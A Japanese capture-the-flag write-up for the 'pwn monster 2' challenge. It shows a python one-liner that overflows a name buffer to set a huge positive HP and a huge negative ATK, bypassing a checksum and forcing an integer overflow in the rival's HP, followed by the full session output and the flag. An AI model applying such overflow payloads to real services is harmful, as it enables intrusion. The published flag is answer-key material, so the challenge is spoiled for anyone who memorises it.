# pwn monster 2:Pwn:300pts
pwn monster 2ではバグ技を検知する機構を追加しました。  
`nc 35.200.120.35 9002`  
[pwn_monster_2.zip](pwn_monster_2.zip)  

# Solution
[pwn monster 1](../pwn_monster_1)にチート検出が組み込まれたようだ。  
ncしてみる。  
```bash
$ nc 35.200.120.35 9002
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key

Welcome to Pwn Monster World!
I'll give first monster!
Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Checksum: 110
Input name: SatokiSatokiSatokiSatokiSatoki
+--------+--------------------+----------------------+
|name    | 0x6153696b6f746153 |             SatokiSa |
|        | 0x6f746153696b6f74 |             tokiSato |
|HP      | 0x696b6f746153696b |  7596287742130219371 |
|ATK     | 0x0000696b6f746153 |      115910152315219 |
+--------+--------------------+----------------------+
Checksum: 7596403652282534590
Detect cheat.

```
どうやらHPとATKを加算して、110かチェックしているようだ。  
HPとATKをとてつもなく大きい逆符号の数にし、和が110になるよう調整すればよい。  
HPをマイナス、ATKをプラスにすると負けてしまう可能性がある(負けないかもしれないが)ため、HPをプラス、ATKをマイナスにすればよい。  
自分のHPが十分に多い場合にはそれが0になるまで攻撃が続くので、相手のHPが増加してオーバーフローすることで負になると予想できる。  
以下のように適当に調整した。  
```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A"*16+b"\xff\xff\xff\xff\xff\xff\xff\x00\x6f\x00\x00\x00\x00\x00\x00\xff"+b"\n")' | nc 35.200.120.35 9002
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key

Welcome to Pwn Monster World!
I'll give first monster!
Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Checksum: 110
Input name: +--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x00ffffffffffffff |    72057594037927935 |
|ATK     | 0xff0000000000006f |   -72057594037927825 |
+--------+--------------------+----------------------+
Checksum: 110
OK, Nice name.
Let's battle with Rival! If you win, give you FLAG.
[You] AAAAAAAAAAAAAAAA HP: 72057594037927935
[Rival] pwnchu HP: 9999
Your Turn.
Rival monster took -72057594037927825 damage!
[You] AAAAAAAAAAAAAAAA HP: 72057594037927935
[Rival] pwnchu HP: 72057594037937824
Rival Turn.
Your monster took 9999 damage!
[You] AAAAAAAAAAAAAAAA HP: 72057594037917936
[Rival] pwnchu HP: 72057594037937824
Your Turn.
~~~
Your Turn.
Rival monster took -72057594037927825 damage!
[You] AAAAAAAAAAAAAAAA HP: 72057594036658062
[Rival] pwnchu HP: 9223372036854771599
Rival Turn.
Your monster took 9999 damage!
[You] AAAAAAAAAAAAAAAAx HP: 72057594036648063
[Rival] pwnchu HP: 9223372036854771599
Your Turn.
Rival monster took -72057594037927825 damage!
[You] AAAAAAAAAAAAAAAAx HP: 72057594036648063
[Rival] pwnchu HP: -9151314442816852192
Win!
nitic_ctf{buffer_and_1nteger_overfl0w}

```
flagが表示された。  

## nitic_ctf{buffer_and_1nteger_overfl0w}